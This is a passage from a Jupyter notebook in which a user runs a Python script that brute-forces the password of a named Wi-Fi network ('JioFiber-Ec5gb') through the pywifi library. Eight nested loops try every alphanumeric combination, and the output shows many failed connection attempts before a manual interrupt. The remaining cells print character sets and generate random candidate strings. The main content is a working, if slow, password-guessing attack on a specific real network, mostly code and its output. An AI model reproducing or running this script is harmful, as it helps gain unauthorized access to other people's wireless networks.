     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:33,714 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADu\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:34,864 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADv\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:36,013 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:37,180 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADx\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:38,341 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADy\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:39,527 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAADz\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:42,544 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAD0\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:44,006 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAD1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:45,240 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAD2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:31:46,484 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAD3\n"
     ]
    },
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "Input \u001b[1;32mIn [3]\u001b[0m, in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[0;32m     11\u001b[0m \u001b[38;5;28;01mfor\u001b[39;00m g \u001b[38;5;129;01min\u001b[39;00m \u001b[38;5;28mall\u001b[39m:\n\u001b[0;32m     12\u001b[0m     \u001b[38;5;28;01mfor\u001b[39;00m h \u001b[38;5;129;01min\u001b[39;00m \u001b[38;5;28mall\u001b[39m:\n\u001b[1;32m---> 13\u001b[0m         \u001b[43mconnect_to_wifi\u001b[49m\u001b[43m(\u001b[49m\u001b[38;5;124;43m'\u001b[39;49m\u001b[38;5;124;43mJioFiber-Ec5gb\u001b[39;49m\u001b[38;5;124;43m'\u001b[39;49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[38;5;124;43mf\u001b[39;49m\u001b[38;5;124;43m'\u001b[39;49m\u001b[38;5;132;43;01m{\u001b[39;49;00m\u001b[43ma\u001b[49m\u001b[38;5;132;43;01m}\u001b[39;49;00m\u001b[38;5;132;43;01m{\u001b[39;49;00m\u001b[43mb\u001b[49m\u001b[38;5;132;43;01m}\u001b[39;49;00m\u001b[38;5;132;43;01m{\u001b[39;49;00m\u001b[43mc\u001b[49m\u001b[38;5;132;43;01m}\u001b[39;49;00m\u001b[38;5;132;43;01m{\u001b[39;49;00m\u001b[43md\u001b[49m\u001b[38;5;132;43;01m}\u001b[39;49;00m\u001b[38;5;132;43;01m{\u001b[39;49;00m\u001b[43me\u001b[49m\u001b[38;5;132;43;01m}\u001b[39;49;00m\u001b[38;5;132;43;01m{\u001b[39;49;00m\u001b[43mf\u001b[49m\u001b[38;5;132;43;01m}\u001b[39;49;00m\u001b[38;5;132;43;01m{\u001b[39;49;00m\u001b[43mg\u001b[49m\u001b[38;5;132;43;01m}\u001b[39;49;00m\u001b[38;5;132;43;01m{\u001b[39;49;00m\u001b[43mh\u001b[49m\u001b[38;5;132;43;01m}\u001b[39;49;00m\u001b[38;5;124;43m'\u001b[39;49m\u001b[43m)\u001b[49m\n",
      "Input \u001b[1;32mIn [1]\u001b[0m, in \u001b[0;36mconnect_to_wifi\u001b[1;34m(ssid, password)\u001b[0m\n\u001b[0;32m     13\u001b[0m profile\u001b[38;5;241m.\u001b[39mkey \u001b[38;5;241m=\u001b[39m password\n\u001b[0;32m     15\u001b[0m iface\u001b[38;5;241m.\u001b[39mremove_all_network_profiles()\n\u001b[1;32m---> 16\u001b[0m tmp_profile \u001b[38;5;241m=\u001b[39m \u001b[43miface\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43madd_network_profile\u001b[49m\u001b[43m(\u001b[49m\u001b[43mprofile\u001b[49m\u001b[43m)\u001b[49m\n\u001b[0;32m     17\u001b[0m iface\u001b[38;5;241m.\u001b[39mconnect(tmp_profile)\n\u001b[0;32m     19\u001b[0m \u001b[38;5;28;01mfor\u001b[39;00m i \u001b[38;5;129;01min\u001b[39;00m \u001b[38;5;28mrange\u001b[39m(\u001b[38;5;241m3000\u001b[39m): \n",
      "File \u001b[1;32mc:\\Users\\VIMALAKAMESH\\AppData\\Local\\Programs\\Python\\Python310\\lib\\site-packages\\pywifi\\iface.py:68\u001b[0m, in \u001b[0;36mInterface.add_network_profile\u001b[1;34m(self, params)\u001b[0m\n\u001b[0;32m     65\u001b[0m \u001b[38;5;28;01mdef\u001b[39;00m \u001b[38;5;21madd_network_profile\u001b[39m(\u001b[38;5;28mself\u001b[39m, params):\n\u001b[0;32m     66\u001b[0m     \u001b[38;5;124;03m\"\"\"Add the info of the AP for connecting afterward.\"\"\"\u001b[39;00m\n\u001b[1;32m---> 68\u001b[0m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43m_wifi_ctrl\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43madd_network_profile\u001b[49m\u001b[43m(\u001b[49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43m_raw_obj\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mparams\u001b[49m\u001b[43m)\u001b[49m\n",
      "File \u001b[1;32mc:\\Users\\VIMALAKAMESH\\AppData\\Local\\Programs\\Python\\Python310\\lib\\site-packages\\pywifi\\_wifiutil_win.py:388\u001b[0m, in \u001b[0;36mWifiUtil.add_network_profile\u001b[1;34m(self, obj, params)\u001b[0m\n\u001b[0;32m    380\u001b[0m xml \u001b[38;5;241m+\u001b[39m\u001b[38;5;241m=\u001b[39m \u001b[38;5;124m\"\"\"\u001b[39m\u001b[38;5;124m<MacRandomization xmlns=\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mhttp://www.microsoft.com/networking/WLAN/profile/v3\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m>\u001b[39m\n\u001b[0;32m    381\u001b[0m \u001b[38;5;124m        <enableRandomization>false</enableRandomization>\u001b[39m\n\u001b[0;32m    382\u001b[0m \u001b[38;5;124m    </MacRandomization>\u001b[39m\n\u001b[0;32m    383\u001b[0m \u001b[38;5;124m</WLANProfile>\u001b[39m\n\u001b[0;32m    384\u001b[0m \u001b[38;5;124m\u001b[39m\u001b[38;5;124m\"\"\"\u001b[39m\n\u001b[0;32m    386\u001b[0m xml \u001b[38;5;241m=\u001b[39m xml\u001b[38;5;241m.\u001b[39mformat(\u001b[38;5;241m*\u001b[39m\u001b[38;5;241m*\u001b[39mprofile_data)\n\u001b[1;32m--> 388\u001b[0m status \u001b[38;5;241m=\u001b[39m \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43m_wlan_set_profile\u001b[49m\u001b[43m(\u001b[49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43m_handle\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mobj\u001b[49m\u001b[43m[\u001b[49m\u001b[38;5;124;43m'\u001b[39;49m\u001b[38;5;124;43mguid\u001b[39;49m\u001b[38;5;124;43m'\u001b[39;49m\u001b[43m]\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mxml\u001b[49m\u001b[43m,\u001b[49m\n\u001b[0;32m    389\u001b[0m \u001b[43m                                \u001b[49m\u001b[38;5;28;43;01mTrue\u001b[39;49;00m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mbyref\u001b[49m\u001b[43m(\u001b[49m\u001b[43mreason_code\u001b[49m\u001b[43m)\u001b[49m\u001b[43m)\u001b[49m\n\u001b[0;32m    390\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m status \u001b[38;5;241m!=\u001b[39m ERROR_SUCCESS:\n\u001b[0;32m    391\u001b[0m     \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_logger\u001b[38;5;241m.\u001b[39mdebug(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mStatus \u001b[39m\u001b[38;5;132;01m%d\u001b[39;00m\u001b[38;5;124m: Add profile failed\u001b[39m\u001b[38;5;124m\"\u001b[39m, status)\n",
      "File \u001b[1;32mc:\\Users\\VIMALAKAMESH\\AppData\\Local\\Programs\\Python\\Python310\\lib\\site-packages\\pywifi\\_wifiutil_win.py:570\u001b[0m, in \u001b[0;36mWifiUtil._wlan_set_profile\u001b[1;34m(self, handle, iface_guid, xml, overwrite, reason_code)\u001b[0m\n\u001b[0;32m    567\u001b[0m func\u001b[38;5;241m.\u001b[39margtypes \u001b[38;5;241m=\u001b[39m [HANDLE, POINTER(\n\u001b[0;32m    568\u001b[0m     GUID), DWORD, c_wchar_p, c_wchar_p, c_bool, c_void_p, POINTER(DWORD)]\n\u001b[0;32m    569\u001b[0m func\u001b[38;5;241m.\u001b[39mrestypes \u001b[38;5;241m=\u001b[39m [DWORD]\n\u001b[1;32m--> 570\u001b[0m \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[43mfunc\u001b[49m\u001b[43m(\u001b[49m\u001b[43mhandle\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43miface_guid\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[38;5;241;43m2\u001b[39;49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mxml\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[38;5;28;43;01mNone\u001b[39;49;00m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43moverwrite\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[38;5;28;43;01mNone\u001b[39;49;00m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mreason_code\u001b[49m\u001b[43m)\u001b[49m\n",
      "\u001b[1;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "import IPython.display as dp\n",
    "\n",
    "all = uppercase+lowercase+numbers\n",
    "len_all = len(all)\n",
    "for a in all:\n",
    "    for b in all:\n",
    "        for c in all:\n",
    "            for d in all:\n",
    "                for e in all:\n",
    "                    for f in all:\n",
    "                        for g in all:\n",
    "                            for h in all:\n",
    "                                connect_to_wifi('JioFiber-Ec5gb', f'{a}{b}{c}{d}{e}{f}{g}{h}')\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Uppercase Alphabets:\n",
      "\"A\",\"B\",\"C\",\"D\",\"E\",\"F\",\"G\",\"H\",\"I\",\"J\",\"K\",\"L\",\"M\",\"N\",\"O\",\"P\",\"Q\",\"R\",\"S\",\"T\",\"U\",\"V\",\"W\",\"X\",\"Y\",\"Z\",\n",
      "Lowercase Alphabets:\n",
      "\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\",\"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\"r\",\"s\",\"t\",\"u\",\"v\",\"w\",\"x\",\"y\",\"z\",\n",
      "Numbers:\n",
      "\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\","
     ]
    }
   ],
   "source": [
    "# Uppercase alphabets\n",
    "print(\"Uppercase Alphabets:\")\n",
    "for char in range(ord('A'), ord('Z')+1):\n",
    "    print(f\"\\\"{chr(char)}\\\"\", end=\",\")\n",
    "\n",
    "# Lowercase alphabets\n",
    "print(\"\\nLowercase Alphabets:\")\n",
    "for char in range(ord('a'), ord('z')+1):\n",
    "    print(f\"\\\"{chr(char)}\\\"\", end=\",\")\n",
    "\n",
    "# Numbers\n",
    "print(\"\\nNumbers:\")\n",
    "for num in range(0, 10):\n",
    "    print(f\"\\\"{num}\\\"\", end=\",\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Random words:\n",
      "$*yBN?+H4-&)U\n",
      "Fa[B=,KWg*\n",
      ")11q'r+Av:i\n",
      "*OeFM7(\\t9c!J0pEm\n",
      "a~&E/<DjrttK0u\n",
      "8Qk[.=g*YIGRYUYY\n",
      "}N\"}c&mE.*aepr)]F\n",
      "MUGDG>y\n",
      "i}73FET>JBln,/9X\n",
      "6n89s_<c_zDuS9\n",
      "5ez={#TT4m{\n",
      "Kv>i7H)!\n",
      "7I+lKh^B\n",
      "(T)nXnxV.9q\n",
      "]mL.7UHcyyaAi\n",
      "V7C?,ZZf.$L\n",
      "kVUl>u\\C+ji6\n",
      "IL'/uWb#o*L|.o\n",
      ",?G!d)T+2)E24m<\n",
      "`*@*!j!fvPytRP>\n",
      "\n",
      "Filtered words (more than 7 characters):\n",
      "$*yBN?+H4-&)U\n",
      "Fa[B=,KWg*\n",
      ")11q'r+Av:i\n",
      "*OeFM7(\\t9c!J0pEm\n",
      "a~&E/<DjrttK0u\n",
      "8Qk[.=g*YIGRYUYY\n",
      "}N\"}c&mE.*aepr)]F\n",
      "i}73FET>JBln,/9X\n",
      "6n89s_<c_zDuS9\n",
      "5ez={#TT4m{\n",
      "Kv>i7H)!\n",
      "7I+lKh^B\n",
      "(T)nXnxV.9q\n",
      "]mL.7UHcyyaAi\n",
      "V7C?,ZZf.$L\n",
      "kVUl>u\\C+ji6\n",
      "IL'/uWb#o*L|.o\n",
      ",?G!d)T+2)E24m<\n",
      "`*@*!j!fvPytRP>\n"
     ]
    }
   ],
   "source": [
    "import random\n",
    "import string\n",
    "\n",
    "def generate_random_string(length):\n",
    "    characters = string.ascii_letters + string.digits + string.punctuation\n",
    "    return ''.join(random.choice(characters) for _ in range(length))\n",
    "\n",
    "def generate_words(num_words, min_length):\n",
    "    words = []\n",
    "    for _ in range(num_words):\n",
    "        word_length = random.randint(min_length, min_length + 10)\n",
    "        word = generate_random_string(word_length)\n",
    "        words.append(word)\n",
    "    return words\n",
    "\n",
    "def filter_words(words, min_length):\n",
    "    return [word for word in words if len(word) > min_length]\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    num_words = 20\n",
    "    min_length = 7\n",
    "\n",
    "    random_words = generate_words(num_words, min_length)\n",
    "    filtered_words = filter_words(random_words, min_length)\n",
    "    \n",
    "    print(\"Random words:\")\n",
    "    for word in random_words:\n",
    "        print(word)\n",
    "    \n",
    "    print(\"\\nFiltered words (more than 7 characters):\")\n",
    "    for word in filtered_words:\n",
    "        print(word)\n"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
